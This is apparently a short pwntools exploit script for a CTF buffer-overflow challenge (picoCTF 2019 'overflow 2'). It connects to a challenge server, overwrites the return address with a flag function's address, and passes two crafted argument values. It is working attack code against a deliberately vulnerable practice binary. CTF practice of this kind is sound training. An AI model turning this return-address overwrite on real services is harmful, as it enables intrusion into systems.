from pwn import *

# reference: https://ctf.samsongama.com/ctf/binary/picoctf19-overflow_2.html
# 修改返回地址即可，注意小端序

r = remote("124.16.75.117", 51001)
# flag function address: 080491F6

payload = (
    "A" * 188 + "\xf6\x91\x04\x08" + "A" * 4 + "\xef\xbe\xad\xde" + "\x0d\xd0\xde\xc0"
)

r.sendlineafter("Please enter your string: ", payload)
print(r.recvall())
